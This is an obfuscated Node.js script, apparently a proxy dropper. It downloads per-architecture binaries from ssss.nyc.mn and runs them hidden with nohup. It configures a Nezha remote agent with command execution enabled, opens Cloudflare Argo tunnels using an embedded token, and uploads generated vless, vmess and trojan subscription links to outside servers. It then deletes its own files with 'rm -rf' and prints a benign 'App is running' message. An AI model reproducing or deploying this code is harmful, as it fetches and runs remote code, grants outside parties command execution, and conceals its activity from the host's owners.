_0x1d284e={_0x45e0a1:0x2a3,_0x4bd472:0x225,_0x1fb7de:0x222,_0x3053e1:0x1ff,_0x3bbafb:0x26f,_0x650ee3:0x20e},_0x2ba283={_0x46d8d1:0x221};setTimeout(()=>{const _0x5dff25={_0xb0d4f6:0x294,_0x4f0990:0x29f},_0x1f8ecb=_0x15ad,_0x539d69=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x539d69[_0x1f8ecb(0x2a3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x539d69[_0x1f8ecb(_0x1d284e._0x45e0a1)](phpPath);process[_0x1f8ecb(0x242)]===_0x1f8ecb(_0x1d284e._0x4bd472)?exec(_0x1f8ecb(_0x1d284e._0x1fb7de)+_0x539d69[_0x1f8ecb(_0x1d284e._0x3053e1)]('\x20')+_0x1f8ecb(_0x1d284e._0x3bbafb),_0x4372a7=>{const _0x161027=_0x1f8ecb;console[_0x161027(_0x5dff25._0xb0d4f6)](),console[_0x161027(_0x5dff25._0x4f0990)]('App\x20is\x20running'),console[_0x161027(_0x5dff25._0x4f0990)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1f8ecb(_0x1d284e._0x650ee3)+_0x539d69['join']('\x20')+'\x20>/dev/null\x202>&1',_0x19ec15=>{const _0x1c807b=_0x1f8ecb;console['clear'](),console[_0x1c807b(0x29f)](_0x1c807b(_0x2ba283._0x46d8d1)),console[_0x1c807b(0x29f)](_0x1c807b(0x20f));});},0x15f90);}function _0x282b(){const _0x45bb91=['ARGO_DOMAIN:','vless','https://arm64.ssss.nyc.mn/web','Unhandled\x20error\x20in\x20startserver:','866858mYGxOY','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tls','readdirSync','2134440toAwik','cdns.doon.eu.org','listen','\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','isFile','16KvYdmw','boot.log','tunnel.yml','readFileSync','15kkqpQs','https://ipapi.co/json/','CFIP','/api/delete-nodes','split','path','\x20is\x20running','5aa92665-9502-4410-8c44-8e53413c4b09','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','random','writeFileSync','http://ip-api.com/json/','eyJhIjoiMGY2ZWEyMjJiZjdjMGRlYTE5YmVhOTYyNTcyOGY3ZTAiLCJ0IjoiYzM0NDY3ZjAtYTE2Yi00ZjUyLWExYTQtZTk1MWNhZDIyYmE3IiwicyI6Ik5qVTNZamt4WW1FdFpqTmtOaTAwT1dRekxUZzRZVFF0TkRRMlptUmpNVGs0WlRsaSJ9','\x20-c\x20','Nodes\x20uploaded\x20successfully','&path=%2Fvless-argo%3Fed%3D2560#','true','https://amd64.ssss.nyc.mn/v1','clear','--tls','firefox','Content-Type','unlinkSync','tcp','ArgoDomain:','NAME','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','2087','log','config.json','child_process','direct','push','\x0a\x20\x20\x20\x20','get','test','Error\x20in\x20startserver:','./tmp','/config.json\x20>/dev/null\x202>&1\x20&','axios','none','.exe\x20>\x20nul\x202>&1','PROJECT_URL','https://arm64.ssss.nyc.mn/agent','toString','pipe','arch','9653215CijktO','includes','quic','block','post','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','237556CKreGO','ARGO_AUTH','https://oooo.serv00.net/add-url','mkdirSync','Empowerment\x20failed\x20for\x20','config.yaml','join','abcdefghijklmnopqrstuvwxyz','charAt','?security=tls&sni=','Add\x20automatic\x20access\x20task\x20faild:\x20','/vless-argo','list.txt','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','filter','stringify','then','443','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','rm\x20-rf\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','existsSync','catch','\x0a\x0avmess://','tunnel.json','SUB_PATH','&fp=firefox&type=ws&host=','/api/add-subscriptions','taskkill\x20/f\x20/im\x20','CFPORT','\x0a\x20\x20credentials-file:\x20','nohup\x20','arm64','error','false','/trojan-argo','response','send','App\x20is\x20running','del\x20/f\x20/q\x20','127.0.0.1','\x20-p\x20','win32','2053','\x20already\x20exists','\x0a\x20\x20tunnel:\x20','Skipping\x20adding\x20automatic\x20access\x20task','country_code','https://amd64.ssss.nyc.mn/bot','\x0aclient_secret:\x20','unlink','ARGO_PORT','createWriteStream','NEZHA_SERVER','has','1665321dJRXXq','data','2083','Download\x20','util','20WCffjF','text/plain;\x20charset=utf-8','http\x20server\x20is\x20running\x20on\x20port:','fileName','sub.txt','\x0avless://','length','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','arm','vmess','statSync','platform','close','http','https://arm64.ssss.nyc.mn/bot','utf-8','AUTO_ACCESS','forEach','pop','org','PORT','chmod','\x22\x20>\x20/dev/null\x202>&1','https+local://8.8.8.8/dns-query','FILE_PATH','Error\x20executing\x20command:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20failed:\x20','env','72jSrMGJ','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','365170VBwTsg','fileUrl','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','status','finish','3188385bFMtbB','?encryption=none&security=tls&sni=','match','Subscription\x20uploaded\x20successfully','2096','message','exec','Error\x20reading\x20boot.log:','\x0a\x0atrojan://','8443','UPLOAD_URL','base64','sub','basename','floor','all','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','application/json','countryCode','Error\x20downloading\x20files:','\x20>\x20nul\x202>&1'];_0x282b=function(){return _0x45bb91;};return _0x282b();}cleanFiles();async function AddVisitTask(){const _0x45ee61={_0x46d21a:0x1fb,_0x111179:0x21c,_0x417335:0x203},_0x26e5e4=_0x2067f2;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x26e5e4(0x229));return;}try{const _0x22e535=await axios['post'](_0x26e5e4(_0x45ee61._0x46d21a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x26e5e4(0x26c)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x22e535;}catch(_0x12e4d7){return console[_0x26e5e4(_0x45ee61._0x111179)](_0x26e5e4(_0x45ee61._0x417335)+_0x12e4d7[_0x26e5e4(0x260)]),null;}}async function startserver(){const _0x335d8c={_0x5d4d20:0x2a7},_0x2f307c=_0x2067f2;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1f0a74){console[_0x2f307c(0x21c)](_0x2f307c(_0x335d8c._0x5d4d20),_0x1f0a74);}}startserver()[_0x2067f2(0x211)](_0x4e0ccc=>{const _0x2af40e={_0x118949:0x21c,_0x49e269:0x273},_0x5cb6df=_0x2067f2;console[_0x5cb6df(_0x2af40e._0x118949)](_0x5cb6df(_0x2af40e._0x49e269),_0x4e0ccc);}),app[_0x2067f2(0x27a)](PORT,()=>console[_0x2067f2(0x29f)](_0x2067f2(0x239)+PORT+'!'));
